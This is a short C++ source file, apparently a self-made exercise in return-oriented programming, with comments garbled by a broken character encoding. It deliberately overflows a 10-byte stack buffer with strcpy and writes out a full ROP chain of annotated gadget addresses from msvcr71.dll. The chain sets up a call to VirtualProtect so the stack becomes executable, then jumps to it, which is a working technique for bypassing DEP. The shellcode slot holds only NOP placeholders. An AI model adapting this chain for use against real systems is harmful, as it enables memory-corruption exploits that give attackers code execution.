/*
������� ������������ rop � ������������ �������� by Charley
*/
#include "stdafx.h"

#include <windows.h>
#include <iostream>

using namespace std;

int _tmain(int argc, _TCHAR* argv[])
{
	HINSTANCE hModule=::LoadLibrary(_T("mfc71.dll"));
	HINSTANCE hModule1=::LoadLibrary(_T("msvcr71.dll"));
	char buffer[10];
	strcpy(buffer, "aaaaaaaaaaaaaaaaaaaaaaaa"
		"\x23\x62\x37\x7c" //# POP EAX # RETN 
		"\x23\x62\x37\x7c" //# ��� ����� � EAX
		"\x1f\x59\x37\x7c"	//# PUSH ESP # ADD EAX,DWORD PTR DS:[EAX] # ADD CH,BL # INC EBP # OR AL,59 # POP ECX # POP EBP # RETN
		//xor ebp,ebp
		"\x11\x11\x11\x11" // # ��� ����� � EBP
		"\x6e\x60\x37\x7c" //# POP EBX # RETN
		"\x11\x11\x11\x11" //��� ����� � EBX
		"\x6a\x76\x36\x7c" //# SUB EBP,EBX # OR ESI,ESI # RETN
		//
		//xor ebx,ebx
		"\x23\x62\x37\x7c" //# POP EAX # RETN
		"\x11\x11\x11\x11" //��� ����� � EAX
		"\x05\x1e\x35\x7C" //# NEG EAX # RETN
		"\x6e\x60\x37\x7c" //# POP EBX # RETN
		"\x11\x11\x11\x11"
		"\x74\x21\x35\x7c" //# ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN
		//
		"\x75\x40\x36\x7c"	//# XOR EAX,EAX # RETN
		"\x02\xa0\x35\x7c" //# ADD EAX,ECX # RETN
		"\x05\x1e\x35\x7C" //# NEG EAX # RETN
		"\x74\x21\x35\x7c" //# ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN
		"\x6a\x76\x36\x7c" //# SUB EBP,EBX # OR ESI,ESI # RETN
		"\x6e\x60\x37\x7c" //# POP EBX # RETN
		"\xe4\xfd\xff\xff" //��� ����� � EBX  21b*(-1)=de4
		"\x6a\x76\x36\x7c" //# SUB EBP,EBX # OR ESI,ESI # RETN
		"\x23\x62\x37\x7c" //# POP EAX # RETN
		"\xe8\xfd\xff\xff" // (-1)*����� ����
		"\x05\x1e\x35\x7C" //# NEG EAX # RETN
		"\x02\xa0\x35\x7c" //# ADD EAX,ECX # RETN
		"\x20\x02\x35\x7c" // # POP EDI # POP ESI # RETN    
		"\x11\x11\x11\x11" // # ��� ����� � EDI
		"\x22\x22\x22\x22" // # ��� ����� � ESI
		"\x27\x34\x34\x7C" //MOV ECX, EAX / MOV EAX, ESI / POP ESI / RETN 10
		"\x33\x33\x33\x33" // # ��� ����� � ESI
		"\x23\x62\x37\x7c" //# POP EAX # RETN
		"\x33\x33\x33\x33" // # ��� �������������
		"\x33\x33\x33\x33" // # ��� �������������
		"\x33\x33\x33\x33" // # ��� �������������
		"\x33\x33\x33\x33" // # ��� �������������
		"\xC0\xFF\xFF\xFF" // # -0x40: ��� ����� � EAX 
		"\x05\x1e\x35\x7C" // # NEG EAX / RETN 
		"\xc8\x03\x35\x7C" // # MOV DS:[ECX], EAX / RETN 
		"\x40\xa0\x35\x7C" // # MOV EAX, ECX / RETN
		"\xA1\x1D\x34\x7C" // # DEC EAX / RETN x12
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\x08\x94\x16\x7C" // # MOV DS:[EAX+0x4], EAX / RETN 
		"\xB9\x1F\x34\x7C" //x4. # INC EAX / RETN
		"\xB9\x1F\x34\x7C"
		"\xB9\x1F\x34\x7C"
		"\xB9\x1F\x34\x7C"
		"\xB2\x01\x15\x7C" // # MOV [EAX+0x4], 1 
		"\xA1\x1D\x34\x7C" //x15 # DEC EAX / RETN
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\xA1\x1D\x34\x7C"
		"\x27\x34\x34\x7C" // # MOV ECX, EAX / MOV EAX, ESI / POP ESI / RETN 10
		"\x33\x33\x33\x33" // # ��� ����� � ESI
		"\x40\xa0\x35\x7C" // # MOV EAX, ECX / RETN
		"\x33\x33\x33\x33" // # ��� �������������
		"\x33\x33\x33\x33" // # ��� �������������
		"\x33\x33\x33\x33" // # ��� �������������
		"\x33\x33\x33\x33" // # ��� �������������
		"\xB9\x1F\x34\x7C" //x8 # INC EAX / RETN 
		"\xB9\x1F\x34\x7C"
		"\xB9\x1F\x34\x7C"
		"\xB9\x1F\x34\x7C"
		"\xB9\x1F\x34\x7C"
		"\xB9\x1F\x34\x7C"
		"\xB9\x1F\x34\x7C"
		"\xB9\x1F\x34\x7C"
		"\xE5\x6B\x36\x7C" // MOV DS:[EAX+0x14], ECX
		"\xBA\x1F\x34\x7C" //����� retn
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xBA\x1F\x34\x7C"
		"\xDD\x28\x35\x7C" // # CALL VirtualProtect / LEA ESP, [EBP-58] / POP EDI / ESI / EBX / LEAVE / RETN
		"AAAABBBBCCCCDDDD"
		//"\x1A\xF2\x35\x7C" // # ADD ESP, 0xC / RETN
		//"XXXYYYZZZ123" // # �����������, ������� ���������
		"\x30\x5C\x34\x7C" // # PUSH ESP / RETN
		"\x90\x90\x90\x90" //� ����� ����� ���������� ��� ���� ���
); 
return 0;
}

